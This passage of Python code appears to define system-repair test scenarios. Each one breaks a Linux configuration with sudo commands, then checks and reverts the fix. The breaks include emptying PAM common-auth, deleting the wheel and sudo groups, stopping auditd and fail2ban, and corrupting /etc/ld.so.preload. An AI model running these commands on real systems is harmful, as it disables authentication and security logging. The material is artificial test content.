        run_cmd_sudo("echo '/nonexistent/lib.so' >> /etc/ld.so.preload")
        return {"broken": "invalid LD_PRELOAD library"}
    
    def validate_ld_preload():
        result = run_cmd("cat /etc/ld.so.preload 2>/dev/null")
        return "/nonexistent" not in result.get("stdout", "")
    
    def cleanup_ld_preload():
        run_cmd_sudo("sed -i '/nonexistent/d' /etc/ld.so.preload 2>/dev/null || true")
        run_cmd_sudo("rm /etc/ld.so.preload 2>/dev/null || true")
    
    scenario_id += 1
    scenarios.append(TestScenario(
        id=scenario_id, category=Category.KERNEL_SURGERY,
        name="Invalid LD_PRELOAD entry",
        description="/etc/ld.so.preload contains a nonexistent library.",
        difficulty=5,
        break_system=break_ld_preload, validate_fix=validate_ld_preload, cleanup=cleanup_ld_preload,

    ))
    
    def break_sysctl():
        run_cmd_sudo("sysctl -w net.ipv4.ip_forward=0 2>/dev/null || true")
        run_cmd_sudo("echo 'net.ipv4.ip_forward=0' > /etc/sysctl.d/99-broken.conf")
        return {"broken": "IP forwarding disabled via sysctl"}
    
    def validate_sysctl():
        result = run_cmd("cat /proc/sys/net/ipv4/ip_forward")
        return result.get("stdout", "").strip() == "1"
    
    def cleanup_sysctl():
        run_cmd_sudo("rm /etc/sysctl.d/99-broken.conf 2>/dev/null || true")
        run_cmd_sudo("sysctl -w net.ipv4.ip_forward=1 2>/dev/null || true")
    
    scenario_id += 1
    scenarios.append(TestScenario(
        id=scenario_id, category=Category.KERNEL_SURGERY,
        name="Sysctl IP forwarding disabled",
        description="IP forwarding is disabled breaking routing.",
        difficulty=4,
        break_system=break_sysctl, validate_fix=validate_sysctl, cleanup=cleanup_sysctl,

    ))
    
    def break_env_var():
        run_cmd_sudo("echo 'export PATH=/nonexistent:$PATH' >> /etc/environment")
        return {"broken": "PATH has invalid directory in /etc/environment"}
    
    def validate_env_var():
        result = run_cmd("grep 'nonexistent' /etc/environment")
        return not result["success"]
    
    def cleanup_env_var():
        run_cmd_sudo("sed -i '/nonexistent/d' /etc/environment")
    
    scenario_id += 1
    scenarios.append(TestScenario(
        id=scenario_id, category=Category.OODA_LOGIC,
        name="Invalid PATH in environment",
        description="/etc/environment has an invalid PATH entry.",
        difficulty=3,
        break_system=break_env_var, validate_fix=validate_env_var, cleanup=cleanup_env_var,

    ))
    
    def break_broken_script():
        run_cmd_sudo("mkdir -p /tmp/script_test")
        run_cmd_sudo("echo '#!/bin/bash' > /tmp/script_test/init.sh")
        run_cmd_sudo("echo 'echo Starting...' >> /tmp/script_test/init.sh")
        run_cmd_sudo("echo 'exit 1' >> /tmp/script_test/init.sh")
        run_cmd_sudo("echo 'echo Done' >> /tmp/script_test/init.sh")
        run_cmd_sudo("chmod +x /tmp/script_test/init.sh")
        return {"broken": "init script has early exit causing failure"}
    
    def validate_broken_script():
        result = run_cmd("/tmp/script_test/init.sh 2>/dev/null")
        return result["success"] or not run_cmd("test -f /tmp/script_test/init.sh")["success"]
    
    def cleanup_broken_script():
        run_cmd_sudo("rm -rf /tmp/script_test")
    
    scenario_id += 1
    scenarios.append(TestScenario(
        id=scenario_id, category=Category.OODA_LOGIC,
        name="Init script causing early exit",
        description="An initialization script has 'exit 1' causing failures.",
        difficulty=4,
        break_system=break_broken_script, validate_fix=validate_broken_script, cleanup=cleanup_broken_script,

    ))
    
    def break_cron_syntax():
        run_cmd_sudo("echo '99 99 99 99 99 root echo broken' > /etc/cron.d/broken-job")
        return {"broken": "cron job with invalid syntax"}
    
    def validate_cron_syntax():
        result = run_cmd("test -f /etc/cron.d/broken-job")
        return not result["success"]
    
    def cleanup_cron_syntax():
        run_cmd_sudo("rm /etc/cron.d/broken-job 2>/dev/null || true")
    
    scenario_id += 1
    scenarios.append(TestScenario(
        id=scenario_id, category=Category.RED_TEAM,
        name="Cron job with invalid syntax",
        description="A cron job file has invalid time specification.",
        difficulty=3,
        break_system=break_cron_syntax, validate_fix=validate_cron_syntax, cleanup=cleanup_cron_syntax,

    ))
    
    def break_grub_config():
        run_cmd_sudo("cp /etc/default/grub /etc/default/grub.backup 2>/dev/null || true")
        run_cmd_sudo("echo 'GRUB_CMDLINE_LINUX=\"broken=true\"' >> /etc/default/grub")
        return {"broken": "invalid GRUB configuration parameter"}
    
    def validate_grub_config():
        result = run_cmd("grep 'broken=true' /etc/default/grub")
        return not result["success"]
    
    def cleanup_grub_config():
        run_cmd_sudo("mv /etc/default/grub.backup /etc/default/grub 2>/dev/null || true")
        run_cmd_sudo("sed -i '/broken=true/d' /etc/default/grub")
    
    scenario_id += 1
    scenarios.append(TestScenario(
        id=scenario_id, category=Category.KERNEL_SURGERY,
        name="Invalid GRUB configuration",
        description="/etc/default/grub has an invalid parameter.",
        difficulty=4,
        break_system=break_grub_config, validate_fix=validate_grub_config, cleanup=cleanup_grub_config,

    ))
    
    def break_wheel_group():
        run_cmd_sudo("groupdel wheel 2>/dev/null || true")
        run_cmd_sudo("sed -i 's/%wheel ALL=(ALL) ALL/#%wheel ALL=(ALL) ALL/' /etc/sudoers 2>/dev/null || true")
        return {"broken": "wheel group deleted"}
    
    def validate_wheel_group():
        result = run_cmd("getent group wheel")
        return result["success"]
    
    def cleanup_wheel_group():
        run_cmd_sudo("groupadd wheel 2>/dev/null || true")
    
    scenario_id += 1
    scenarios.append(TestScenario(
        id=scenario_id, category=Category.RED_TEAM,
        name="Wheel group deleted",
        description="The wheel/admin group has been removed.",
        difficulty=3,
        break_system=break_wheel_group, validate_fix=validate_wheel_group, cleanup=cleanup_wheel_group,

    ))
    
    def break_fail2ban():
        run_cmd_sudo("systemctl stop fail2ban 2>/dev/null || true")
        run_cmd_sudo("touch /tmp/fail2ban_was_stopped")
        return {"broken": "fail2ban stopped (no brute force protection)"}
    
    def validate_fail2ban():
        result = run_cmd_sudo("systemctl is-active fail2ban 2>/dev/null || apt list --installed 2>/dev/null | grep fail2ban")
        return "active" in result.get("stdout", "") or "fail2ban" in result.get("stdout", "")
    
    def cleanup_fail2ban():
        run_cmd_sudo("systemctl start fail2ban 2>/dev/null || true")
        run_cmd_sudo("rm /tmp/fail2ban_was_stopped 2>/dev/null || true")
    
    scenario_id += 1
    scenarios.append(TestScenario(
        id=scenario_id, category=Category.RED_TEAM,
        name="Fail2ban service stopped",
        description="Fail2ban intrusion prevention is not running.",
        difficulty=3,
        break_system=break_fail2ban, validate_fix=validate_fail2ban, cleanup=cleanup_fail2ban,

    ))
    
    def break_auditd():
        run_cmd_sudo("systemctl stop auditd 2>/dev/null || true")
        run_cmd_sudo("touch /tmp/auditd_was_stopped")
        return {"broken": "auditd stopped (no audit logging)"}
    
    def validate_auditd():
        result = run_cmd_sudo("systemctl is-active auditd 2>/dev/null || apt list --installed 2>/dev/null | grep auditd")
        is_active = "active" in result.get("stdout", "")
        is_installed = "auditd" in result.get("stdout", "")
        return is_active or is_installed
    
    def cleanup_auditd():
        run_cmd_sudo("systemctl start auditd 2>/dev/null || true")
        run_cmd_sudo("rm /tmp/auditd_was_stopped 2>/dev/null || true")
    
    scenario_id += 1
    scenarios.append(TestScenario(
        id=scenario_id, category=Category.RED_TEAM,
        name="Auditd service stopped",
        description="Linux audit daemon is not running (no security logging).",
        difficulty=3,
        break_system=break_auditd, validate_fix=validate_auditd, cleanup=cleanup_auditd,

    ))
    
    def break_insecure_script():
        run_cmd_sudo("mkdir -p /tmp/umask_test")
        run_cmd_sudo("echo '#!/bin/bash' > /tmp/umask_test/setup.sh")
        run_cmd_sudo("echo 'umask 000' >> /tmp/umask_test/setup.sh")
        run_cmd_sudo("echo 'touch /tmp/umask_test/created_file' >> /tmp/umask_test/setup.sh")
        run_cmd_sudo("chmod +x /tmp/umask_test/setup.sh")
        return {"broken": "script sets insecure umask 000"}
    
    def validate_insecure_script():
        result = run_cmd("grep '^umask 000$' /tmp/umask_test/setup.sh 2>/dev/null")
        return not result["success"] or not run_cmd("test -f /tmp/umask_test/setup.sh")["success"]
    
    def cleanup_insecure_script():
        run_cmd_sudo("rm -rf /tmp/umask_test")
    
    scenario_id += 1
    scenarios.append(TestScenario(
        id=scenario_id, category=Category.RED_TEAM,
        name="Script with insecure umask setting",
        description="A setup script sets umask 000 creating world-writable files.",
        difficulty=4,
        break_system=break_insecure_script, validate_fix=validate_insecure_script, cleanup=cleanup_insecure_script,

    ))
    
    def break_tmp_cleanup():
        run_cmd_sudo("mkdir -p /tmp/old_data")
        for i in range(100):
            run_cmd_sudo(f"touch /tmp/old_data/file_{i}.tmp")
        run_cmd_sudo("touch -d '30 days ago' /tmp/old_data/*")
        return {"broken": "100 old temp files need cleanup"}
    
    def validate_tmp_cleanup():
        result = run_cmd("ls /tmp/old_data 2>/dev/null | wc -l")
        count = int(result.get("stdout", "100").strip() or "100")
        return count < 10 or not run_cmd("test -d /tmp/old_data")["success"]
    
    def cleanup_tmp_cleanup():
        run_cmd_sudo("rm -rf /tmp/old_data")
    
    scenario_id += 1
    scenarios.append(TestScenario(
        id=scenario_id, category=Category.OODA_LOGIC,
        name="Old temp files need cleanup",
        description="100 temp files older than 30 days need removal.",
        difficulty=2,
        break_system=break_tmp_cleanup, validate_fix=validate_tmp_cleanup, cleanup=cleanup_tmp_cleanup,

    ))
    
    def break_disk_quota():
        run_cmd_sudo("mkdir -p /tmp/quota_test")
        run_cmd_sudo("dd if=/dev/zero of=/tmp/quota_test/disk_hog bs=1M count=500 2>/dev/null || true")
        return {"broken": "500MB file consuming disk space"}
    
    def validate_disk_quota():
        result = run_cmd("test -f /tmp/quota_test/disk_hog")
        return not result["success"]
    
    def cleanup_disk_quota():
        run_cmd_sudo("rm -rf /tmp/quota_test")
    
    scenario_id += 1
    scenarios.append(TestScenario(
        id=scenario_id, category=Category.FILESYSTEM_DESTRUCTION,
        name="Large file consuming disk space",
        description="A 500MB file is consuming unnecessary disk space.",
        difficulty=2,
        break_system=break_disk_quota, validate_fix=validate_disk_quota, cleanup=cleanup_disk_quota,

    ))
    

    
    def break_hosts_file():
        run_cmd_sudo("cp /etc/hosts /etc/hosts.backup")
        run_cmd_sudo("echo '999.999.999.999 localhost' > /etc/hosts")
        return {"broken": "/etc/hosts has invalid localhost entry"}
    
    def validate_hosts_file():
        result = run_cmd("grep '127.0.0.1.*localhost' /etc/hosts")
        return result["success"]
    
    def cleanup_hosts_file():
        run_cmd_sudo("mv /etc/hosts.backup /etc/hosts 2>/dev/null || echo '127.0.0.1 localhost' > /etc/hosts")
    
    scenario_id += 1
    scenarios.append(TestScenario(
        id=scenario_id, category=Category.CHAOS_ENGINEERING,
        name="Corrupted /etc/hosts file",
        description="/etc/hosts has invalid localhost mapping breaking network resolution.",
        difficulty=5,
        break_system=break_hosts_file, validate_fix=validate_hosts_file, cleanup=cleanup_hosts_file,

    ))
    
    def break_hostname():
        run_cmd_sudo("cp /etc/hostname /etc/hostname.backup 2>/dev/null || true")
        run_cmd_sudo("echo '' > /etc/hostname")
        return {"broken": "/etc/hostname is empty"}
    
    def validate_hostname():
        result = run_cmd("cat /etc/hostname")
        hostname = result.get("stdout", "").strip()
        return len(hostname) > 0
    
    def cleanup_hostname():
        run_cmd_sudo("mv /etc/hostname.backup /etc/hostname 2>/dev/null || echo 'ubuntu' > /etc/hostname")
    
    scenario_id += 1
    scenarios.append(TestScenario(
        id=scenario_id, category=Category.CHAOS_ENGINEERING,
        name="Empty /etc/hostname",
        description="System hostname file is empty causing identity issues.",
        difficulty=4,
        break_system=break_hostname, validate_fix=validate_hostname, cleanup=cleanup_hostname,

    ))
    
    def break_locale():
        run_cmd_sudo("cp /etc/default/locale /etc/default/locale.backup 2>/dev/null || true")
        run_cmd_sudo("echo 'LANG=invalid_LOCALE.UTF-8' > /etc/default/locale")
        return {"broken": "invalid locale configuration"}
    
    def validate_locale():
        result = run_cmd("grep -E '^LANG=(en_US|C|POSIX)' /etc/default/locale 2>/dev/null || locale 2>&1")
        return result["success"] and "invalid" not in result.get("stdout", "").lower()
    
    def cleanup_locale():
        run_cmd_sudo("mv /etc/default/locale.backup /etc/default/locale 2>/dev/null || echo 'LANG=en_US.UTF-8' > /etc/default/locale")
    
    scenario_id += 1
    scenarios.append(TestScenario(
        id=scenario_id, category=Category.CHAOS_ENGINEERING,
        name="Invalid locale configuration",
        description="/etc/default/locale has invalid LANG setting.",
        difficulty=4,
        break_system=break_locale, validate_fix=validate_locale, cleanup=cleanup_locale,

    ))
    
    def break_bashrc():
        run_cmd_sudo("cp /etc/bash.bashrc /etc/bash.bashrc.backup")
        run_cmd_sudo("echo 'syntax error here {{{{' >> /etc/bash.bashrc")
        return {"broken": "/etc/bash.bashrc has syntax error"}
    
    def validate_bashrc():
        result = run_cmd("bash -n /etc/bash.bashrc 2>&1")
        return result["success"]
    
    def cleanup_bashrc():
        run_cmd_sudo("mv /etc/bash.bashrc.backup /etc/bash.bashrc")
    
    scenario_id += 1
    scenarios.append(TestScenario(
        id=scenario_id, category=Category.CHAOS_ENGINEERING,
        name="Syntax error in system bashrc",
        description="/etc/bash.bashrc has a syntax error breaking shell initialization.",
        difficulty=5,
        break_system=break_bashrc, validate_fix=validate_bashrc, cleanup=cleanup_bashrc,

    ))
    
    def break_apt_sources():
        run_cmd_sudo("cp /etc/apt/sources.list /etc/apt/sources.list.backup")
        run_cmd_sudo("echo 'deb http://nonexistent.invalid/ubuntu jammy main' > /etc/apt/sources.list")
        return {"broken": "apt sources.list pointing to invalid repository"}
    
    def validate_apt_sources():
        result = run_cmd("grep -E 'ubuntu\\.com|archive\\.ubuntu' /etc/apt/sources.list 2>/dev/null || apt update 2>&1 | grep -v 'nonexistent'")
        return "nonexistent" not in run_cmd("cat /etc/apt/sources.list").get("stdout", "")
    
    def cleanup_apt_sources():
        run_cmd_sudo("mv /etc/apt/sources.list.backup /etc/apt/sources.list")
    
    scenario_id += 1
    scenarios.append(TestScenario(
        id=scenario_id, category=Category.CHAOS_ENGINEERING,
        name="Corrupted APT sources.list",
        description="/etc/apt/sources.list points to nonexistent repository.",
        difficulty=5,
        break_system=break_apt_sources, validate_fix=validate_apt_sources, cleanup=cleanup_apt_sources,

    ))
    
    def break_group_file():
        run_cmd_sudo("cp /etc/group /etc/group.backup")
        run_cmd_sudo("sed -i 's/sudo:/nosudo:/' /etc/group")
        return {"broken": "sudo group renamed breaking sudo access"}
    
    def validate_group_file():
        result = run_cmd("grep '^sudo:' /etc/group")
        return result["success"]
    
    def cleanup_group_file():
        run_cmd_sudo("mv /etc/group.backup /etc/group")
    
    scenario_id += 1
    scenarios.append(TestScenario(
        id=scenario_id, category=Category.CHAOS_ENGINEERING,
        name="Sudo group missing from /etc/group",
        description="The sudo group has been renamed breaking privilege escalation.",
        difficulty=5,
        break_system=break_group_file, validate_fix=validate_group_file, cleanup=cleanup_group_file,

    ))
    
    def break_shells():
        run_cmd_sudo("cp /etc/shells /etc/shells.backup")
        run_cmd_sudo("sed -i '/\\/bin\\/bash/d' /etc/shells")
        return {"broken": "/bin/bash removed from valid shells"}
    
    def validate_shells():
        result = run_cmd("grep '/bin/bash' /etc/shells")
        return result["success"]
    
    def cleanup_shells():
        run_cmd_sudo("mv /etc/shells.backup /etc/shells")
    
    scenario_id += 1
    scenarios.append(TestScenario(
        id=scenario_id, category=Category.CHAOS_ENGINEERING,
        name="/bin/bash missing from /etc/shells",
        description="/bin/bash is not listed as valid shell preventing logins.",
        difficulty=4,
        break_system=break_shells, validate_fix=validate_shells, cleanup=cleanup_shells,

    ))
    
    def break_ld_conf():
        run_cmd_sudo("cp /etc/ld.so.conf /etc/ld.so.conf.backup")
        run_cmd_sudo("echo '/nonexistent/lib' > /etc/ld.so.conf")
        run_cmd_sudo("ldconfig 2>/dev/null || true")
        return {"broken": "ld.so.conf pointing to nonexistent path"}
    
    def validate_ld_conf():
        result = run_cmd("grep '/nonexistent' /etc/ld.so.conf")
        return not result["success"]
    
    def cleanup_ld_conf():
        run_cmd_sudo("mv /etc/ld.so.conf.backup /etc/ld.so.conf")
        run_cmd_sudo("ldconfig 2>/dev/null || true")
    
    scenario_id += 1
    scenarios.append(TestScenario(
        id=scenario_id, category=Category.CHAOS_ENGINEERING,
        name="Invalid /etc/ld.so.conf",
        description="Dynamic linker config points to nonexistent library path.",
        difficulty=5,
        break_system=break_ld_conf, validate_fix=validate_ld_conf, cleanup=cleanup_ld_conf,

    ))
    
    def break_motd():
        run_cmd_sudo("cp /etc/motd /etc/motd.backup 2>/dev/null || true")
        run_cmd_sudo("chmod 000 /etc/motd 2>/dev/null || true")
        run_cmd_sudo("chattr +i /etc/motd 2>/dev/null || true")
        return {"broken": "/etc/motd is locked and inaccessible"}
    
    def validate_motd():
        result = run_cmd("cat /etc/motd 2>/dev/null || test ! -f /etc/motd")
        return result["success"]
    
    def cleanup_motd():
        run_cmd_sudo("chattr -i /etc/motd 2>/dev/null || true")
        run_cmd_sudo("chmod 644 /etc/motd 2>/dev/null || true")
        run_cmd_sudo("mv /etc/motd.backup /etc/motd 2>/dev/null || true")
    
    scenario_id += 1
    scenarios.append(TestScenario(
        id=scenario_id, category=Category.CHAOS_ENGINEERING,
        name="Locked /etc/motd file",
        description="/etc/motd has immutable flag and no permissions.",
        difficulty=4,
        break_system=break_motd, validate_fix=validate_motd, cleanup=cleanup_motd,

    ))
    
    def break_nsswitch():
        run_cmd_sudo("cp /etc/nsswitch.conf /etc/nsswitch.conf.backup")
        run_cmd_sudo("sed -i 's/hosts:.*/hosts: invalid/' /etc/nsswitch.conf")
        return {"broken": "nsswitch.conf has invalid hosts configuration"}
    
    def validate_nsswitch():
        result = run_cmd("grep 'hosts:.*files' /etc/nsswitch.conf")
        return result["success"]
    
    def cleanup_nsswitch():
        run_cmd_sudo("mv /etc/nsswitch.conf.backup /etc/nsswitch.conf")
    
    scenario_id += 1
    scenarios.append(TestScenario(
        id=scenario_id, category=Category.CHAOS_ENGINEERING,
        name="Broken /etc/nsswitch.conf",
        description="Name service switch config is corrupted breaking DNS resolution.",
        difficulty=5,
        break_system=break_nsswitch, validate_fix=validate_nsswitch, cleanup=cleanup_nsswitch,

    ))
    
    def break_security_limits():
        run_cmd_sudo("cp /etc/security/limits.conf /etc/security/limits.conf.backup")
        run_cmd_sudo("echo '* hard nofile 1' >> /etc/security/limits.conf")
        return {"broken": "limits.conf sets max open files to 1"}
    
    def validate_security_limits():
        result = run_cmd("grep 'nofile.*1$' /etc/security/limits.conf")
        return not result["success"]
    
    def cleanup_security_limits():
        run_cmd_sudo("mv /etc/security/limits.conf.backup /etc/security/limits.conf")
    
    scenario_id += 1
    scenarios.append(TestScenario(
        id=scenario_id, category=Category.CHAOS_ENGINEERING,
        name="Restrictive security limits",
        description="/etc/security/limits.conf limits open files to 1.",
        difficulty=5,
        break_system=break_security_limits, validate_fix=validate_security_limits, cleanup=cleanup_security_limits,

    ))
    
    def break_logrotate():
        run_cmd_sudo("cp /etc/logrotate.conf /etc/logrotate.conf.backup")
        run_cmd_sudo("echo 'invalid syntax here!!!' >> /etc/logrotate.conf")
        return {"broken": "logrotate.conf has syntax error"}
    
    def validate_logrotate():
        result = run_cmd("logrotate -d /etc/logrotate.conf 2>&1")
        return "error" not in result.get("stderr", "").lower()
    
    def cleanup_logrotate():
        run_cmd_sudo("mv /etc/logrotate.conf.backup /etc/logrotate.conf")
    
    scenario_id += 1
    scenarios.append(TestScenario(
        id=scenario_id, category=Category.CHAOS_ENGINEERING,
        name="Broken logrotate configuration",
        description="/etc/logrotate.conf has syntax errors preventing log rotation.",
        difficulty=4,
        break_system=break_logrotate, validate_fix=validate_logrotate, cleanup=cleanup_logrotate,

    ))
    
    def break_sysctl_conf():
        run_cmd_sudo("cp /etc/sysctl.conf /etc/sysctl.conf.backup")
        run_cmd_sudo("echo 'kernel.panic = -999' >> /etc/sysctl.conf")
        return {"broken": "sysctl.conf has dangerous kernel.panic value"}
    
    def validate_sysctl_conf():
        result = run_cmd("grep 'kernel.panic.*-999' /etc/sysctl.conf")
        return not result["success"]
    
    def cleanup_sysctl_conf():
        run_cmd_sudo("mv /etc/sysctl.conf.backup /etc/sysctl.conf")
    
    scenario_id += 1
    scenarios.append(TestScenario(
        id=scenario_id, category=Category.CHAOS_ENGINEERING,
        name="Dangerous sysctl configuration",
        description="/etc/sysctl.conf has dangerous kernel.panic = -999.",
        difficulty=5,
        break_system=break_sysctl_conf, validate_fix=validate_sysctl_conf, cleanup=cleanup_sysctl_conf,

    ))
    
    def break_cron_deny():
        run_cmd_sudo("echo 'root' > /etc/cron.deny 2>/dev/null || true")
        return {"broken": "root added to cron.deny blocking cron jobs"}
    
    def validate_cron_deny():
        result = run_cmd("grep '^root$' /etc/cron.deny 2>/dev/null")
        return not result["success"]
    
    def cleanup_cron_deny():
        run_cmd_sudo("sed -i '/^root$/d' /etc/cron.deny 2>/dev/null || rm /etc/cron.deny 2>/dev/null || true")
    
    scenario_id += 1
    scenarios.append(TestScenario(
        id=scenario_id, category=Category.CHAOS_ENGINEERING,
        name="Root blocked from cron",
        description="root user added to /etc/cron.deny blocking scheduled tasks.",
        difficulty=4,
        break_system=break_cron_deny, validate_fix=validate_cron_deny, cleanup=cleanup_cron_deny,

    ))
    
    def break_alternatives():
        run_cmd_sudo("update-alternatives --set editor /bin/false 2>/dev/null || true")
        return {"broken": "default editor set to /bin/false"}
    
    def validate_alternatives():
        result = run_cmd("update-alternatives --display editor 2>/dev/null | grep 'currently'")
        return "/bin/false" not in result.get("stdout", "")
    
    def cleanup_alternatives():
        run_cmd_sudo("update-alternatives --auto editor 2>/dev/null || true")
    
    scenario_id += 1
    scenarios.append(TestScenario(
        id=scenario_id, category=Category.CHAOS_ENGINEERING,
        name="Broken editor alternatives",
        description="System editor alternative points to /bin/false.",
        difficulty=4,
        break_system=break_alternatives, validate_fix=validate_alternatives, cleanup=cleanup_alternatives,

    ))
    
    def break_magic():
        run_cmd_sudo("cp /etc/magic /etc/magic.backup 2>/dev/null || true")
        run_cmd_sudo("echo 'corrupted magic file' > /etc/magic")
        return {"broken": "/etc/magic file corrupted"}
    
    def validate_magic():
        result = run_cmd("file /bin/bash 2>&1")
        return "executable" in result.get("stdout", "").lower() or "ELF" in result.get("stdout", "")
    
    def cleanup_magic():
        run_cmd_sudo("mv /etc/magic.backup /etc/magic 2>/dev/null || rm /etc/magic 2>/dev/null || true")
    
    scenario_id += 1
    scenarios.append(TestScenario(
        id=scenario_id, category=Category.CHAOS_ENGINEERING,
        name="Corrupted /etc/magic file",
        description="/etc/magic is corrupted breaking file type detection.",
        difficulty=4,
        break_system=break_magic, validate_fix=validate_magic, cleanup=cleanup_magic,

    ))
    
    def break_inputrc():
        run_cmd_sudo("cp /etc/inputrc /etc/inputrc.backup")
        run_cmd_sudo("echo 'set invalid-option on' >> /etc/inputrc")
        return {"broken": "/etc/inputrc has invalid option"}
    
    def validate_inputrc():
        result = run_cmd("grep 'invalid-option' /etc/inputrc")
        return not result["success"]
    
    def cleanup_inputrc():
        run_cmd_sudo("mv /etc/inputrc.backup /etc/inputrc")
    
    scenario_id += 1
    scenarios.append(TestScenario(
        id=scenario_id, category=Category.CHAOS_ENGINEERING,
        name="Broken readline config",
        description="/etc/inputrc has invalid option breaking shell input.",
        difficulty=4,
        break_system=break_inputrc, validate_fix=validate_inputrc, cleanup=cleanup_inputrc,

    ))
    
    def break_issue():
        run_cmd_sudo("cp /etc/issue /etc/issue.backup")
        run_cmd_sudo("chmod 000 /etc/issue")
        return {"broken": "/etc/issue has no read permissions"}
    
    def validate_issue():
        result = run_cmd("cat /etc/issue 2>/dev/null")
        return result["success"]
    
    def cleanup_issue():
        run_cmd_sudo("chmod 644 /etc/issue")
        run_cmd_sudo("mv /etc/issue.backup /etc/issue 2>/dev/null || true")
    
    scenario_id += 1
    scenarios.append(TestScenario(
        id=scenario_id, category=Category.CHAOS_ENGINEERING,
        name="Unreadable /etc/issue",
        description="/etc/issue has no permissions blocking login banner.",
        difficulty=3,
        break_system=break_issue, validate_fix=validate_issue, cleanup=cleanup_issue,

    ))
    
    def break_services():
        run_cmd_sudo("cp /etc/services /etc/services.backup")
        run_cmd_sudo("echo 'http 99999/tcp' >> /etc/services")
        return {"broken": "/etc/services has invalid port number"}
    
    def validate_services():
        result = run_cmd("grep '99999' /etc/services")
        return not result["success"]
    
    def cleanup_services():
        run_cmd_sudo("mv /etc/services.backup /etc/services")
    
    scenario_id += 1
    scenarios.append(TestScenario(
        id=scenario_id, category=Category.CHAOS_ENGINEERING,
        name="Invalid port in /etc/services",
        description="/etc/services defines http on invalid port 99999.",
        difficulty=4,
        break_system=break_services, validate_fix=validate_services, cleanup=cleanup_services,

    ))
    
    def break_timezone_file():
        run_cmd_sudo("mv /etc/timezone /etc/timezone.backup 2>/dev/null || true")
        run_cmd_sudo("echo 'Invalid/Timezone' > /etc/timezone")
        return {"broken": "/etc/timezone has invalid timezone"}
    
    def validate_timezone_file():
        result = run_cmd("cat /etc/timezone")
        tz = result.get("stdout", "").strip()
        return tz != "Invalid/Timezone" and "/" in tz
    
    def cleanup_timezone_file():
        run_cmd_sudo("mv /etc/timezone.backup /etc/timezone 2>/dev/null || echo 'UTC' > /etc/timezone")
    
    scenario_id += 1
    scenarios.append(TestScenario(
        id=scenario_id, category=Category.CHAOS_ENGINEERING,
        name="Invalid /etc/timezone",
        description="/etc/timezone contains invalid timezone string.",
        difficulty=4,
        break_system=break_timezone_file, validate_fix=validate_timezone_file, cleanup=cleanup_timezone_file,

    ))
    
    def break_machine_id():
        run_cmd_sudo("cp /etc/machine-id /etc/machine-id.backup 2>/dev/null || true")
        run_cmd_sudo("echo 'invalid' > /etc/machine-id")
        return {"broken": "/etc/machine-id is invalid"}
    
    def validate_machine_id():
        result = run_cmd("cat /etc/machine-id")
        mid = result.get("stdout", "").strip()
        return len(mid) == 32 and mid.isalnum()
    
    def cleanup_machine_id():
        run_cmd_sudo("mv /etc/machine-id.backup /etc/machine-id 2>/dev/null || systemd-machine-id-setup")
    
    scenario_id += 1
    scenarios.append(TestScenario(
        id=scenario_id, category=Category.CHAOS_ENGINEERING,
        name="Invalid /etc/machine-id",
        description="/etc/machine-id is corrupted breaking systemd services.",
        difficulty=5,
        break_system=break_machine_id, validate_fix=validate_machine_id, cleanup=cleanup_machine_id,

    ))
    
    def break_pam_common():
        run_cmd_sudo("cp /etc/pam.d/common-auth /etc/pam.d/common-auth.backup 2>/dev/null || true")
        run_cmd_sudo("echo '# PAM disabled' > /etc/pam.d/common-auth")
        return {"broken": "PAM common-auth is empty"}
    
    def validate_pam_common():
        result = run_cmd("grep 'pam_unix' /etc/pam.d/common-auth")
        return result["success"]
    
    def cleanup_pam_common():
        run_cmd_sudo("mv /etc/pam.d/common-auth.backup /etc/pam.d/common-auth 2>/dev/null || pam-auth-update --force")
    
    scenario_id += 1
    scenarios.append(TestScenario(
        id=scenario_id, category=Category.CHAOS_ENGINEERING,
        name="Empty PAM common-auth",
        description="/etc/pam.d/common-auth is empty breaking authentication.",
        difficulty=5,
        break_system=break_pam_common, validate_fix=validate_pam_common, cleanup=cleanup_pam_common,

    ))
    
    def break_gai_conf():
        run_cmd_sudo("cp /etc/gai.conf /etc/gai.conf.backup 2>/dev/null || true")
        run_cmd_sudo("echo 'precedence ::ffff:0:0/96 100' > /etc/gai.conf")
        return {"broken": "gai.conf forces IPv4-mapped IPv6 addresses"}
    
    def validate_gai_conf():        
        result = run_cmd("grep '::ffff:0:0/96.*100' /etc/gai.conf 2>/dev/null")
        return not result["success"]
    
    def cleanup_gai_conf():
        run_cmd_sudo("mv /etc/gai.conf.backup /etc/gai.conf 2>/dev/null || rm /etc/gai.conf 2>/dev/null || true")
    
    scenario_id += 1
    scenarios.append(TestScenario(
        id=scenario_id, category=Category.CHAOS_ENGINEERING,
        name="Broken getaddrinfo config",
        description="/etc/gai.conf has wrong address precedence.",
        difficulty=4,
        break_system=break_gai_conf, validate_fix=validate_gai_conf, cleanup=cleanup_gai_conf,

    ))
    
    def break_subuid():
        run_cmd_sudo("cp /etc/subuid /etc/subuid.backup 2>/dev/null || true")
        run_cmd_sudo("chmod 000 /etc/subuid")
        return {"broken": "/etc/subuid has no permissions"}
    
    def validate_subuid():
        result = run_cmd("cat /etc/subuid 2>/dev/null")
        return result["success"]
    
    def cleanup_subuid():
        run_cmd_sudo("chmod 644 /etc/subuid")
        run_cmd_sudo("mv /etc/subuid.backup /etc/subuid 2>/dev/null || true")
    
    scenario_id += 1
    scenarios.append(TestScenario(
        id=scenario_id, category=Category.CHAOS_ENGINEERING,
        name="Unreadable /etc/subuid",
        description="/etc/subuid has no permissions breaking container features.",
        difficulty=3,
        break_system=break_subuid, validate_fix=validate_subuid, cleanup=cleanup_subuid,

    ))
    
    def break_updatedb():
        run_cmd_sudo("cp /etc/updatedb.conf /etc/updatedb.conf.backup 2>/dev/null || true")
        run_cmd_sudo("echo 'PRUNEPATHS=\"/\"' > /etc/updatedb.conf")
        return {"broken": "updatedb.conf prunes entire filesystem"}
    
    def validate_updatedb():
        result = run_cmd("grep 'PRUNEPATHS=\"/\"' /etc/updatedb.conf 2>/dev/null")
        return not result["success"]
    
    def cleanup_updatedb():
        run_cmd_sudo("mv /etc/updatedb.conf.backup /etc/updatedb.conf 2>/dev/null || true")
    
    scenario_id += 1
    scenarios.append(TestScenario(
        id=scenario_id, category=Category.CHAOS_ENGINEERING,
        name="Broken mlocate config",
        description="/etc/updatedb.conf prunes entire filesystem from indexing.",
        difficulty=4,
        break_system=break_updatedb, validate_fix=validate_updatedb, cleanup=cleanup_updatedb,

    ))
    
    def break_adduser():
        run_cmd_sudo("cp /etc/adduser.conf /etc/adduser.conf.backup 2>/dev/null || true")
        run_cmd_sudo("echo 'DSHELL=/bin/nonexistent' > /etc/adduser.conf")
        return {"broken": "adduser.conf has invalid default shell"}
    
